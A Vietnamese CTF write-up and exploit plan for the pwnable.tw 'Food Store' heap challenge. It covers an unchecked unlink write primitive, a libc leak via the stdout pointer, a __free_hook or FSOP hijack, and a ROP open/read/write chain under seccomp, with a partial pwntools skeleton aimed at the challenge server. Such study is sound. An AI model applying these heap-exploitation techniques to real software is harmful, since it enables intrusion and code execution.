# Food Store (pwnable.tw) — Hướng khai thác & phát triển mã khai thác

> **Mục đích học tập / BlueTeam.** Toàn bộ nhằm hiểu & tái hiện kỹ thuật khai thác heap trên một
> binary CTF local (flag giả tại `/home/food_store/flag`). Không nhắm vào hệ thống thực.
>
> Tài liệu nền: `images/view_source.md` (chức năng & luồng), `images/README_new.md` (đính lỗi
> phân tích cũ, kiểm chứng assembly qua IDA MCP). Remote gốc: `chall.pwnable.tw:10406`.

---

## 1. Mục tiêu & ràng buộc (đã kiểm chứng)

**Mục tiêu**: do seccomp chặn `execve`, không thể spawn shell → phải dựng **ORW**
(`open`→`read`→`write`) đọc flag ra `stdout`.

| Ràng buộc | Hệ quả khai thác |
|---|---|
| Full RELRO | **Không ghi GOT** → nhắm hook (`__free_hook`/`__malloc_hook`), FILE vtable/FSOP, hoặc saved-RIP |
| PIE | cần leak **cả** libc **và** heap (và/hoặc PIE base) |
| Stack Canary + FORTIFY | không có BOF stack kinh điển; các read đều `*_chk` |
| seccomp (ALLOW `open/read/write/writev/close/mmap/munmap`+exits+sigreturn) | endgame = **ret2syscall ORW**; `open(2)` được phép |
| glibc **2.24** | **không tcache**; fastbins (≤`0x80`) + unsorted/small; còn `__malloc_hook`/`__free_hook`; dính các kỹ thuật fastbin-dup / fastbin-into-libc / FSOP cổ điển |

---

## 2. Đính chính các "ý tưởng khai thác" tham khảo bên ngoài

Phần ý tưởng dán kèm là một **khung chung** (generic) có vài điểm **sai so với binary này** —
đã đối chiếu ground-truth để tránh đi sai hướng:

| Ý tưởng tham khảo | Thực tế binary (đã kiểm chứng) | Dùng được? |
|---|---|---|
| "glibc 2.25 / Ubuntu 17.04" | libc đi kèm là **glibc 2.24** | ⚠️ Sửa version; không tcache |
| "seccomp chặn open/read/write, chỉ cho sigreturn/exit" | seccomp **CHO PHÉP** `open/read/write/writev/mmap/munmap/close` | ❌ Sai → ORW **trực tiếp** được, không cần side-channel |
| "Heap Overflow qua chức năng edit/modify" | **Không có** hàm edit; không có linear overflow (mọi copy đều bounded) | ❌ Không áp dụng |
| "Arbitrary size allocation" | Kích thước các struct **cố định** (0x28/0x88/0x38/0x50) | ❌ Không áp dụng |
| Fastbin fd corruption → fake chunk trong `.bss` → arb-write | Khả thi **nếu bootstrap được 1 write** (dùng unlink) | ✅ Kỹ thuật tốt (xem §5) |
| Ghi đè `stdout` (`_IO_write_base/_ptr`) để leak libc (FSOP) | `stdout` FILE* **nằm ngay `.bss` `0x205020`** → mục tiêu rất hợp lý | ✅ Rất phù hợp |
| fastbin-into-libc cạnh `stdin`, căn size `0x7f` | Kỹ thuật 2.24 kinh điển, khả thi sau khi có leak | ✅ Tuỳ chọn |
| Overwrite hook/FILE vtable → **stack pivot** → ROP ORW | Hợp lý; one_gadget vô dụng (seccomp) nên phải ORW | ✅ Đúng hướng |

> Tóm lại: **giữ** bộ kỹ thuật endgame (fastbin → fake chunk `.bss` → FSOP/stdout → pivot → ROP ORW),
> **bỏ** tiền đề "heap overflow qua edit", và nhớ **open được phép** nên không cần trick né open.

---

## 3. Các primitive đã kiểm chứng

### 3.1 Write-what-where (có ràng buộc) — unlink `CookedFood` không kiểm tra
`fn_sell_2744` / `fn_eat_2A12` / `fn_assignment_2B62`:
```
prev = node->prev;  next = node->next;
*(prev + 0x28) = next;   // GHI #1
*(next + 0x30) = prev;   // GHI #2
realloc(node, 0);        // free(node)
```
Không có sanity check. Nếu khống chế được `node->prev = P`, `node->next = N`:
```
*(P + 0x28) = N
*(N + 0x30) = P
```
→ hai phép ghi 8-byte **liên kết** (giá trị ghi lại là địa chỉ của phía kia). Mẫu dùng điển hình:
để ghi `WHAT` vào `WHERE`, đặt `P = WHERE - 0x28`, `N = WHAT`; phép ghi phụ `*(WHAT+0x30)=WHERE-0x28`
phải rơi vào vùng ghi được "an toàn" (chọn `WHAT` khéo).

### 3.2 Info-disclosure — "Magic" (`addr_chunk_recipe XOR key8`)
Mỗi lần **Add recipe** in `Magic = (địa_chỉ_chunk_recipe) XOR g_heapMagicKey`. Là leak heap thật
nhưng **bị che bởi key 8 byte random**. Hạn chế (đã phân tích):
- Magic đọc **địa chỉ chunk** (giá trị con trỏ), **không** đọc nội dung chunk → **không** khôi phục
  key bằng cách "pre-fill chunk content" như ghi chú cũ tưởng.
- `addr mod 0x1000` (offset trong trang) là **tất định** theo thứ tự cấp phát → chỉ suy ra được
  **~1.5 byte thấp** của key; các byte cao cần một leak heap độc lập.

### 3.3 Nguồn dữ liệu heap kiểm soát hoàn toàn — `Make`
`Make` (level>3) đọc **31 byte tuỳ ý** vào chunk `0x30` → dùng để **dựng fake chunk / fake node**
cho House-of-Spirit / feng-shui.

### 3.4 Những thứ KHÔNG dùng được (để khỏi mất thời gian)
- ❌ "printf varargs leak" — không tồn tại (đối số được truyền đủ).
- ❌ `strncpy` OOB-read — không reachable với tên dài.
- ❌ `buy()` u32 overflow — bị chặn bởi tồn kho (chỉ để farm nhẹ, không RCE).

---

## 4. Bài toán LEAK (mắt xích khó nhất — cần kiểm chứng động)

Đây là chỗ cả hai ghi chú cũ **chưa giải đúng**. Các lựa chọn, kèm đánh giá thực tế:

1. **Đọc `*(0x205020)` = `&_IO_2_1_stdout_` (libc).** Siêu sạch **nếu** có arbitrary-read. Nhưng
   primitive hiện có là **write** (unlink), chưa phải read → cần biến write thành read gián tiếp
   (ví dụ: dùng write để trỏ một `g_pantrySlots[i]` / một `node->next` vào `.bss`, rồi để **chính
   hàm in của game** đọc hộ — pantry_print in `%s`/`%u`, cooked_food_list in `%lu` tại `node+0x20`).
2. **Unsorted-bin fd/bk → `main_arena` (libc).** Free một `Recipe` (chunk `0x90`) → vào unsorted,
   fd/bk trỏ libc. Cần tạo **overlap** để một field được-in trùng vị trí fd/bk, rồi in ra. (2.24,
   không tcache → unsorted hoạt động "chuẩn sách giáo khoa".)
3. **Magic** → chỉ ra ~1.5 byte key; kết hợp (2) để đủ dữ kiện heap.

> **Khuyến nghị**: hướng (1) kết hợp primitive unlink là sạch nhất — dùng 1 lần unlink-write để
> trỏ một con trỏ **được-in** (slot pantry hoặc `node->next`) vào `0x205018/0x205020`, sau đó gọi
> hàm list tương ứng để game tự in con trỏ libc ra. **Cần gdb để chốt offset/layout** (đánh dấu
> rõ: phần này là giả thuyết thao tác, phải xác minh động).

---

## 5. Chuỗi khai thác đề xuất (ORW) — tích hợp kỹ thuật tham khảo + primitive thật

```
(0) Grind level > 3           : Cook→Eat lặp lại để mở Make (nguồn 31 byte kiểm soát).
(1) Bootstrap 1 WRITE         : dùng unlink chưa-check của CookedFood.
       - Dựng điều kiện để một node có prev/next do ta đặt (heap feng-shui:
         Recipe 0x90 ↔ CookedFood 0x40 ↔ Ingredient 0x30, + House-of-Spirit từ Make).
(2) LEAK libc                 : biến (1) thành "read gián tiếp" — trỏ một con trỏ được-in
       (pantry slot / node->next) vào .bss 0x205020 (stdout*) → gọi list → in ra &_IO_2_1_stdout_
       → libc_base = leak - libc.sym['_IO_2_1_stdout_'].            [cần xác minh offset động]
       (Phương án B: overlap chunk 0x90 unsorted → in fd/bk = main_arena.)
(3) LEAK heap (nếu cần)       : dùng Magic sau khi biết layout, hoặc từ chính (2).
(4) ARBITRARY WRITE mạnh      : lặp unlink / fastbin-dup để ghi nơi tuỳ ý:
       - MỤC TIÊU A: __free_hook = (stack-pivot gadget) ; đặt ROP ORW ở g_tmpMsgBuf(0x205050)
         → kích hoạt free (sell/eat/remove) → pivot → ROP.
       - MỤC TIÊU B: FSOP — ghi đè _IO_2_1_stdout_ vtable / _IO_write_* (2.24 chưa có vtable check)
         → điều khiển luồng khi flush.
(5) ROP ORW                   : với libc 2.24 đã leak:
       open("/home/food_store/flag", 0) ; read(fd, g_tmpMsgBuf, 0x100) ; write(1, g_tmpMsgBuf, n)
       Gadget: ROP(libc) → pop rdi/rsi/rdx/rax ; syscall ; ret (hoặc ret2csu).
```

Lý do chọn `__free_hook` thay vì one_gadget: seccomp chặn `execve` nên one_gadget vô dụng; phải
pivot vào **ROP ORW** đặt sẵn ở buffer ổn định `g_tmpMsgBuf` (`0x205050`, chunk `0x90`).

---

## 6. Khung mã khai thác (pwntools) — tương tác menu ĐÚNG với binary

> Khung này **đồng bộ chuẩn** với menu đã verify (khác hẳn `expl.py` cũ — comment của `expl.py`
> thuộc challenge khác). Dùng để thí nghiệm leak/heap-layout trong gdb rồi điền dần payload.

```python
#!/usr/bin/env python3
from pwn import *

elf  = context.binary = ELF("./food_store_patched")
libc = ELF("./libc.so.6")           # glibc 2.24 đi kèm
# ld  = ELF("./ld-2.24.so")

def start():
    if args.REMOTE:
        return remote("chall.pwnable.tw", 10406)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript="""
            # breakrva 0x2800   # unlink write #1 (sell)
            # breakrva 0x17DC   # add_recipe (Magic)
            c
        """)
    return process([elf.path])

p = start()

# ---------- I/O helpers (khớp fn_read_number/fn_read_string) ----------
PROMPT = b"Your choice: "

def menu(choice):                      # main / recipe / shop đều dùng "Your choice: "
    p.sendlineafter(PROMPT, str(choice).encode())

def set_name(name):                    # fn_player_init_profile_316C, tối đa 7 byte
    p.sendlineafter(b"Your name: ", name)

# --- Recipe submenu (menu 1) ---
def recipe_menu():          menu(1)
def add_recipe(title, ingredient_idxs):
    recipe_menu(); menu(1)             # 1=Add (cần level>1)
    magic = p.recvline_contains(b"Magic :").split(b"Magic :")[1].strip()
    p.sendlineafter(b"Title :", title)
    for i, idx in enumerate(ingredient_idxs):
        p.sendlineafter(b"Choose ingredient :", str(idx).encode())
        more = 1 if i < len(ingredient_idxs) - 1 else 2
        p.sendlineafter(b"(1/Yes,2/No) : ", str(more).encode())
    menu(4)                            # Return
    return bytes.fromhex(magic.decode())   # = (addr_chunk_recipe XOR key)[::?]  -> cần suy key

def remove_recipe(title):
    recipe_menu(); menu(2)             # cần level>2
    p.sendlineafter(b"Title :", title)
    menu(4)

def show_recipe():
    recipe_menu(); menu(3); 
    data = p.recvuntil(b"Your choice: ", drop=True)
    menu(4); return data

# --- Shop submenu (menu 4) ---
def shop_menu():            menu(4)
def buy(idx, qty):
    shop_menu(); menu(1)
    data = p.recvuntil(b"What do you want to buy ? :")
    p.sendline(str(idx).encode())
    p.sendlineafter(b"Quantity :", str(qty).encode())
    menu(4); return data
def sell(idx):
    shop_menu(); menu(2)
    p.sendlineafter(b"What do you want to sell ? :", str(idx).encode())
    menu(4)
def make(name):                        # cần level>3, tốn 100 money; 31 byte kiểm soát
    shop_menu(); menu(3)
    p.sendlineafter(b"Ingredient :", name)
    menu(4)

# --- Main menu actions ---
def assignment(yes=True):
    menu(2); p.sendlineafter(b"(1/Yes,0/No) :", b"1" if yes else b"0")
def chef_info():
    menu(3); return p.recvuntil(b"Your choice: ", drop=True)
def cook(title):
    menu(5); p.sendlineafter(b"What do you want to cook :", title)
def eat(idx):
    menu(6); p.sendlineafter(b"What do you want to eat ? :", str(idx).encode())

def cooked_list():                     # đọc danh sách món đã nấu (No/Name/Price/Energe)
    menu(6)                            # vào Eat chỉ để gọi list
    data = p.recvuntil(b"What do you want to eat ? :")
    p.sendline(b"-1")                  # idx không hợp lệ -> "Can not find", không free
    return data

# ---------- 0) grind level > 3 ----------
# Cook "Pineapple cake"/"Beef noodles" (recipe mặc định) rồi Eat để hồi power; lặp tới level 4.
# (Theo dõi chef_info() để biết level; mỗi Cook +60 exp, cap 0x63 -> ++level.)

# ---------- 1..4) leak + heap feng-shui (điền sau khi debug layout trong gdb) ----------
# TODO: dựng điều kiện unlink với prev/next kiểm soát; leak libc; tính libc_base.

# ---------- 5) ROP ORW (ráp sau khi có libc_base + WWW) ----------
def build_orw(libc_base, buf):
    libc.address = libc_base
    rop = ROP(libc)
    FLAG = b"/home/food_store/flag\x00"
    # Ghi chuỗi đường dẫn vào buf trước (qua write primitive / read), rồi:
    rop.raw(rop.find_gadget(["pop rdi","ret"])); rop.raw(buf)         # fd? -> dùng cho open path
    # open(buf, 0): rdi=buf, rsi=0, rdx=0, rax=2, syscall
    # read(fd, buf2, 0x100); write(1, buf2, 0x100)
    # (chi tiết gadget: pop rdi/rsi/rdx/rax ; syscall ; ret — lấy từ ROP(libc))
    return rop.chain()

p.interactive()
```

> Ghi chú triển khai:
> - `g_tmpMsgBuf` ở `0x205050` (`.bss`) nhưng **giá trị** của nó là **con trỏ heap** tới chunk `0x90`;
>   cần heap leak để biết địa chỉ buffer đặt ROP. Hoặc đặt ROP trong vùng libc đã leak.
> - `Magic` trả 16 hex = `addr XOR key`; dùng để kiểm chứng/bù layout heap sau khi có 1 leak heap độc lập.
> - Sau khi ghi `__free_hook`, kích hoạt bằng bất kỳ `realloc(ptr,0)` nào (sell/eat/remove).

---

## 7. Vấn đề còn mở (cần kiểm chứng động — trung thực)

1. **Bootstrap WRITE đầu tiên**: chuỗi feng-shui chính xác để một `CookedFood` có `prev/next` do ta
   đặt (fastbin 0x40/0x30/0x60, unsorted 0x90; House-of-Spirit từ `Make`). Cần gdb (`vis_heap_chunks`).
2. **LEAK libc đầu tiên**: xác nhận có thể trỏ con-trỏ-được-in vào `0x205020` và game in ra
   `&_IO_2_1_stdout_` (hướng §4.1), hoặc tạo overlap in fd/bk unsorted (§4.2).
3. **Offset libc 2.24**: `_IO_2_1_stdout_`, `__free_hook`, gadget ORW — tính từ `libc.so.6` đi kèm
   bằng `ROP(libc)` / `libc.sym` (không hard-code).
4. **FSOP 2.24**: nếu đi hướng ghi đè `_IO_2_1_stdout_`, kiểm tra điều kiện flush & `_IO_write_*`.

---

## 8. Checklist phát triển exploit

- [ ] Viết lại `expl.py` dựa trên khung §6 (bỏ comment menu của challenge khác).
- [ ] Hàm `level_up()` tự grind tới level 4 (Cook/Eat), xác nhận bằng `chef_info()`.
- [ ] Trong gdb: map chunk của pantry slots / recipe / cooked food / tmpMsgBuf; chọn chiến thuật overlap.
- [ ] Đạt **1 write** qua unlink → biến thành **leak libc** (hướng §4.1 hoặc §4.2).
- [ ] Tính `libc_base`, dựng **WWW ổn định** (unlink lặp hoặc fastbin-dup).
- [ ] Ghi `__free_hook = pivot` (hoặc FSOP), đặt **ROP ORW** ở buffer ổn định, kích hoạt free.
- [ ] Nhận flag qua `write(1, …)`; chạy local (flag giả) trước, rồi `REMOTE`.

---

### Phụ lục — nền tảng đã xác minh
Kiểm chứng assembly qua IDA MCP (`food_store_patched.i64`): unlink không-check (`0x2744`/`0x2A12`/`0x2B62`),
Magic = `addr XOR key` có truyền đối số (`0x17DC`), mọi `__printf_chk` truyền đủ đối số
(`0x15C0`/`0x25E1`), seccomp giải mã từ `0x36E0`, `.bss` có `stdout/stdin/stderr` tại
`0x205020/30/40`, libc = **glibc 2.24**. Chi tiết đính lỗi: `images/README_new.md`.
